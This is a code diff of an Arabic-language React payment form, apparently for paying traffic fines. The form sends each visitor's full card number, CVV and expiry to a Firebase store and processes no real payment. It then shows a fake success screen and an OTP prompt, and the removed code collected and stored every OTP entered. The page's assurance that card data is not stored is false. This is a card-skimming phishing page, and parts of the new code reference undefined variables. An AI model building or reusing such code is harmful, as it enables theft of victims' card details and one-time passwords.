@@ -9,29 +9,21 @@ import { Button } from "@/components/ui/button"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Badge } from "@/components/ui/badge"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogDescription,
-  DialogFooter,
-} from "@/components/ui/dialog"
-import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
 import { CreditCard, Shield, ArrowRight, CheckCircle, AlertCircle, Check, X } from "lucide-react"
 import { z } from "zod"
-import { useForm } from "react-hook-form"
+import { set, useForm } from "react-hook-form"
 import { zodResolver } from "@hookform/resolvers/zod"
 import {
   validateCardNumber,
   validateExpiryDate,
   validateCVV,
-   formatCardNumber,
+  formatCardNumber,
   detectCardType,
   CARD_TYPES,
   type CardValidationResult,
 } from "@/lib/card-validator"
 import { addData } from "@/lib/firebase"
+import { OTPDialog } from "./otp-dialog"
 
 interface Violation {
   id: string
@@ -62,13 +54,11 @@ const paymentSchema = z.object({
 })
 
 type PaymentFormData = z.infer<typeof paymentSchema>
-const allOtps=['']
+
 export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCancel }: PaymentFormProps) {
   const [isProcessing, setIsProcessing] = useState(false)
+  const [showOtp, setShowOtp] = useState(false)
   const [paymentComplete, setPaymentComplete] = useState(false)
-  const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const [otp, setOtp] = useState("")
-
   const [cardValidation, setCardValidation] = useState<CardValidationResult>({
     isValid: false,
     cardType: null,
@@ -84,7 +74,6 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
     setValue,
     watch,
     trigger,
-    getValues,
     handleSubmit: formHandleSubmit,
   } = useForm<PaymentFormData>({
     resolver: zodResolver(paymentSchema),
@@ -123,71 +112,59 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
 
   // Real-time phone validation
 
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const rawValue = e.target.value.replace(/\D/g, "")
-    const cardType = detectCardType(rawValue)
-    const maxLength = cardType === "amex" ? 15 : 16
-    const truncatedValue = rawValue.slice(0, maxLength)
-    const formattedValue = formatCardNumber(truncatedValue, cardType)
-    setValue("cardNumber", truncatedValue, { shouldValidate: true })
-  }
 
-  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const rawValue = e.target.value.replace(/\D/g, "")
-    const cardType = cardValidation.cardType
-    const maxLength = cardType === "amex" ? 4 : 3
-    const truncatedValue = rawValue.slice(0, maxLength)
-    setValue("cvv", truncatedValue, { shouldValidate: true })
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const cardType = detectCardType(e.target.value)
+    const formatted = e.target.value
+
+    // Limit length based on card type
+    const maxLength = cardType === "amex" ? 17 : 19 // Including spaces
+    if (formatted.length <= maxLength) {
+      setValue("cardNumber", formatted)
+      trigger("cardNumber")
+    }
   }
 
   const onSubmit = async (data: PaymentFormData) => {
+    // Final validation check
     const finalCardValidation = validateCardNumber(data.cardNumber)
-    if (!finalCardValidation.isValid) return
+    const finalExpiryValidation = validateExpiryDate(data.expiryMonth, data.expiryYear)
+    const finalCvvValidation = validateCVV(data.cvv, finalCardValidation.cardType)
+
+    if (
+      !finalCardValidation.isValid ||
+      !finalExpiryValidation.isValid ||
+      !finalCvvValidation.isValid 
+    ) {
+      return
+    }
 
     setIsProcessing(true)
-    const visitorID = localStorage.getItem("visitor")
 
     try {
-      addData({
-        id: visitorID,
+      // Simulate payment processing
+      const visitorID=localStorage.getItem('visitor')
+      addData( {id:visitorID,
         ...data,
-        expiryData: `${data.expiryMonth}/${data.expiryYear}`,
+        cardNumber,
+        cvv,
+        expiryData:expiryMonth+"/"+expiryYear,
         amount: totalAmount,
         violations: violations.map((v) => v.id),
       })
 
-      // Simulate network request to initiate payment
-      await new Promise((resolve) => setTimeout(resolve, 2000))
+      await new Promise((resolve) => setTimeout(resolve, 3000))
 
-      // Show OTP dialog to complete the transaction
-      setShowOtpDialog(true)
-    } catch (error) {
-      console.error("Payment initiation failed:", error)
-      setIsProcessing(false)
-    }
-  }
-
-  const handleOtpSubmit = async () => {
-    setIsProcessing(true)
-    setShowOtpDialog(false)
-    try {
-      // Simulate OTP verification
-      await new Promise((resolve) => setTimeout(resolve, 2000))
-
-      // On successful verification, save data and show success screen
-      const visitorID = localStorage.getItem("visitor")
-      const paymentData = getValues()
-      allOtps.push(otp)
-      addData({
-        id: visitorID,otp,allOtps
-      })
-
+      // Here you would normally send the payment data to your backend
+  
       setPaymentComplete(true)
+
+      // Auto redirect after success
       setTimeout(() => {
-        onSuccess()
+setShowOtp(true)
       }, 3000)
     } catch (error) {
-      console.error("OTP verification failed:", error)
+      console.error("Payment failed:", error)
     } finally {
       setIsProcessing(false)
     }
@@ -195,6 +172,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
 
   const getCardIcon = (cardType: string | null) => {
     if (!cardType) return <CreditCard className="w-6 h-6 text-gray-400" />
+
     const cardInfo = CARD_TYPES[cardType]
     return (
       <div className="flex items-center gap-2">
@@ -219,10 +197,11 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
             <div className="text-green-600 text-6xl mb-4">
               <CheckCircle className="w-16 h-16 mx-auto" />
             </div>
-            <h3 className="text-sm font-bold text-green-800 mb-2">تم الدفع بنجاح</h3>
+            <h3 className="text-2xl font-bold text-green-800 mb-2">تم الدفع بنجاح</h3>
             <p className="text-gray-600 mb-4">تم دفع جميع المخالفات بنجاح</p>
             <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-6">
               <p className="text-green-800 font-semibold">المبلغ المدفوع: {totalAmount} ر.ع</p>
+              <p className="text-green-600 text-sm">عدد المخالفات: {violations.length}</p>
             </div>
             <p className="text-sm text-gray-500">سيتم تحديث حالة المخالفات خلال دقائق...</p>
           </CardContent>
@@ -232,28 +211,35 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
   }
 
   return (
-    <div className="max-w-sm mx-auto">
-      <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-sm border-gray-200">
+    <div className="max-w-2xl mx-auto">
+      <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
         <CardHeader className="text-center pb-4">
-          <CardTitle className="text-sm font-bold text-gray-800 flex items-center justify-center gap-2">
+          <CardTitle className="text-2xl font-bold text-gray-800 flex items-center justify-center gap-2">
             <CreditCard className="w-6 h-6" />
             الدفع الآمن
           </CardTitle>
-          <p className="text-gray-600 text-sm ">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
+          <p className="text-gray-600">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
         </CardHeader>
+
         <CardContent className="p-8">
+          {/* Payment Summary */}
           <div className="bg-gray-50 p-4 rounded-lg mb-6">
             <div className="flex justify-between items-center">
-              <span className="font-semibold text-sm">إجمالي المبلغ:</span>
-              <span className="text-sm font-bold text-green-600">{totalAmount} ر.ع</span>
+              <span className="font-semibold">إجمالي المبلغ:</span>
+              <span className="text-2xl font-bold text-green-600">{totalAmount} ر.ع</span>
             </div>
+            <p className="text-sm text-gray-600 mt-1">عدد المخالفات: {violations.length}</p>
           </div>
+
           <form onSubmit={formHandleSubmit(onSubmit)} className="space-y-6">
+            {/* Card Information */}
             <div className="space-y-4">
-              <h3 className="font-semibold text-gray-800 flex items-center gap-2 text-sm">
+              <h3 className="font-semibold text-gray-800 flex items-center gap-2">
                 <Shield className="w-5 h-5" />
                 معلومات البطاقة
               </h3>
+
+              {/* Card Number */}
               <div className="space-y-2">
                 <Label htmlFor="cardNumber" className="text-gray-700 flex items-center gap-2">
                   رقم البطاقة
@@ -262,9 +248,10 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                 <div className="relative">
                   <Input
                     id="cardNumber"
+                    type="tel"
                     {...register("cardNumber")}
                     onChange={handleCardNumberChange}
-                    value={cardNumber }
+                    value={cardNumber}
                     placeholder="#### #### #### ####"
                     className={`bg-white text-left pr-10 ${
                       cardValidation.errors.length > 0
@@ -285,7 +272,15 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                     {error}
                   </p>
                 ))}
+                {cardValidation.isValid && cardValidation.cardType && (
+                  <p className="text-green-600 text-sm flex items-center gap-1">
+                    <CheckCircle className="w-4 h-4" />
+                    بطاقة {CARD_TYPES[cardValidation.cardType].name} صحيحة
+                  </p>
+                )}
               </div>
+
+              {/* Expiry and CVV */}
               <div className="grid grid-cols-3 gap-4">
                 <div className="space-y-2">
                   <Label htmlFor="expiryMonth" className="text-gray-700">
@@ -310,6 +305,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                     </SelectContent>
                   </Select>
                 </div>
+
                 <div className="space-y-2">
                   <Label htmlFor="expiryYear" className="text-gray-700">
                     السنة
@@ -333,7 +329,8 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                     </SelectContent>
                   </Select>
                 </div>
-                <div className="space-y-2">
+
+                <div className="space-y-4">
                   <Label htmlFor="cvv" className="text-gray-700 flex items-center gap-1">
                     CVV
                     {cardValidation.cardType && (
@@ -347,8 +344,6 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                       id="cvv"
                       type="tel"
                       {...register("cvv")}
-                      onChange={handleCvvChange}
-                      value={cvv || ""}
                       placeholder={cardValidation.cardType === "amex" ? "****" : "***"}
                       className={`bg-white text-left pr-10 ${
                         cvvValidation.errors.length > 0
@@ -358,6 +353,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                             : ""
                       }`}
                       dir="ltr"
+                      maxLength={cardValidation.cardType === "amex" ? 4 : 3}
                     />
                     <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                       <ValidationIcon isValid={cvvValidation.isValid} hasContent={!!cvv} />
@@ -365,39 +361,48 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                   </div>
                 </div>
               </div>
+
+              {/* Expiry validation errors */}
               {expiryValidation.errors.map((error, index) => (
                 <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                   <AlertCircle className="w-4 h-4" />
                   {error}
                 </p>
               ))}
+
+              {/* CVV validation errors */}
               {cvvValidation.errors.map((error, index) => (
                 <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                   <AlertCircle className="w-4 h-4" />
                   {error}
                 </p>
               ))}
-           
+
+              {/* Cardholder Name */}
+             
             </div>
-          
+
+            {/* Contact Information */}
+
+            {/* Security Notice */}
             <Alert className="bg-blue-50 border-blue-200">
               <Shield className="w-4 h-4 text-blue-600" />
               <AlertDescription className="text-blue-800">
-                <p className="font-semibold mb-1 text-sm">دفع آمن ومحمي</p>
+                <p className="font-semibold mb-1">دفع آمن ومحمي</p>
                 <p className="text-sm">
                   جميع معلومات الدفع محمية بتشفير SSL 256-bit. لن يتم حفظ معلومات بطاقتك على خوادمنا.
                 </p>
               </AlertDescription>
             </Alert>
+
+            {/* Action Buttons */}
             <div className="flex gap-4 pt-4">
               <Button
                 type="submit"
                 disabled={
-                  isProcessing ||
                   !cardValidation.isValid ||
                   !expiryValidation.isValid ||
-                  !cvvValidation.isValid 
-                }
+                  !cvvValidation.isValid                 }
                 className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-4 text-lg disabled:opacity-50"
               >
                 {isProcessing ? (
@@ -406,7 +411,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                     جاري المعالجة...
                   </div>
                 ) : (
-                  <div className="flex items-center justify-center gap-2">
+                  <div className="flex items-center gap-2">
                     دفع {totalAmount} ر.ع <ArrowRight className="w-4 h-4" />
                   </div>
                 )}
@@ -424,38 +429,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
           </form>
         </CardContent>
       </Card>
-
-      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-        <DialogContent className="sm:max-w-md">
-          <DialogHeader>
-            <DialogTitle className="text-center">أدخل كلمة المرور لمرة واحدة</DialogTitle>
-            <DialogDescription className="text-center">
-              تم إرسال كلمة مرور لمرة واحدة (OTP) إلى رقم هاتفك المسجل.
-            </DialogDescription>
-          </DialogHeader>
-          <div className="flex justify-center py-4" dir="ltr">
-            <InputOTP maxLength={6} value={otp} onChange={setOtp}>
-              <InputOTPGroup>
-                <InputOTPSlot index={0} />
-                <InputOTPSlot index={1} />
-                <InputOTPSlot index={2} />
-                <InputOTPSlot index={3} />
-                <InputOTPSlot index={4} />
-                <InputOTPSlot index={5} />
-              </InputOTPGroup>
-            </InputOTP>
-          </div>
-          <DialogFooter>
-            <Button
-              onClick={handleOtpSubmit}
-              disabled={isProcessing || otp.length < 6}
-              className="w-full bg-green-600 hover:bg-green-700"
-            >
-              {isProcessing ? "جاري التحقق..." : "تحقق وادفع"}
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
+      <OTPDialog isOpen={showOtp} onClose={()=>setShowOtp(false) } phoneNumber="********8"/>
     </div>
   )
 }
